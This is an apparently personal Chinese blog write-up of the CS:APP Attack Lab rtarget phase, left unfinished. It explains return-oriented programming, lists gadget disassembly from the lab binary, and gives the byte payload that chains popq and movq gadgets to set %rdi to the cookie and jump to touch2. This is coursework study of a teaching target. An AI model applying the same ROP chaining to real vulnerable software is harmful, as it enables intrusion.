---
title: attacklab-rtarget（未完成）
tags:
  - csapp
  - attacklab
categories:
  - csapp
keywords:
  - csapp
  - attacklab
  - 栈溢出
  - ROP
  - rtarget
highlight_shrink: true
top_img: >-
  https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232358703.webp
katex: false
copyright_author: adguy
copyright_author_href: 'https://adguycn990.github.io'
copyright_url: 'https://adguycn990.github.io/adguy/aeaca493.html'
copyright_info: 此文章版权归金晖の博客所有，如有转载，请注明来自原作者
abbrlink: aeaca493
date: 2022-11-26 16:46:23
post_copyright:
---

## 写在前面

{% link 官方文档, https://csapp.cs.cmu.edu/3e/attacklab.pdf, https://csapp.cs.cmu.edu/3e/images/csapp3e-cover.jpg %}

和ctarget不同，rtarget程序引入了常见的栈保护机制，如栈随机化，使得程序运行的地址是不确定的。这样便无法通过注入代码（写指令）的方式攻击程序。

但是办法总比困难多。有些人想出了一个叫“断章取义”的办法来攻击程序。即在指令集中截取某一部分指令（掐头不去尾），这部分指令的意思可能会发生变化，然后我们就利用这部分现有的指令去攻击程序。

以官方文档给出的例子为例：

```
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

如果只截取`48 89 c7`这段指令的话，那么我们就生成了一个全新的指令：`movq %rax, %rdi`

实验作者已经把这些可能有帮助的指令全都放到了rtarget的`start_farm`和`mid_farm`中间。

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   
```

实验文档中也提供了一些指令的组合：

### movq S, D

![image-20221126171802112](https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211261903592.webp)

### popq R

![image-20221126171815587](https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211261903431.webp)

### movl S, D

![image-20221126171902793](https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211261903897.webp)

### nop R, R

![image-20221126172041517](https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211261903121.webp)

## Leval1

要求和ctarget的第二阶段一模一样，要使得rdi=cookie。

题目提示我们可以用`popq`指令来解决问题， 而且只需要两条指令就可以实现效果。

`popq`会执行以下两条指令：

```
movq (%rsp), %rax
addq $8, %rsp
```

可惜无法找到`popq %rdi`对应的机器码。但是我们能找到`popq %rax` 对应的`58 + c3`（地址是4019ab）和`movq %rax, %rdi`对应的`48 89 c7 + c3`（地址是4019a2）。把这两段拼起来就能达到我们想要的效果了！

首先是这一段指令：

```
ab 19 40 00 00 00 00 00  /* 覆盖返回地址 */
fa 97 b9 59 00 00 00 00  /* cookie 的值 */
```

覆盖原先的返回地址，到达0x4019ab这个地方执行指令。但是在这个时候，`rsp`指针指向的地址是返回地址加8的位置，因为`getbuf`的ret指令会将rsp+8（别忘了写代码的地方也是一个函数`getbuf`，函数返回时会调用ret指令）。这就让rsp成功指向我们存放cookie的地方。

当popq的时候，就会把cookie存放到rax里面。接着的指令是`90`，跳过，接着是`c3`也就是执行ret指令，返回写代码的地方。

然后：

```
A2 19 40 00 00 00 00 00
```

跳到这个地方执行movq指令，把rax里面的东西存放到rdi里面。然后ret。

最后：

```
EC 17 40 00 00 00 00 00
```

跳转到touch2函数所在地址。

### 总结

这中间rsp的位置到底指向哪里非常的绕，需要对popq, retq有一定的理解才能看懂。
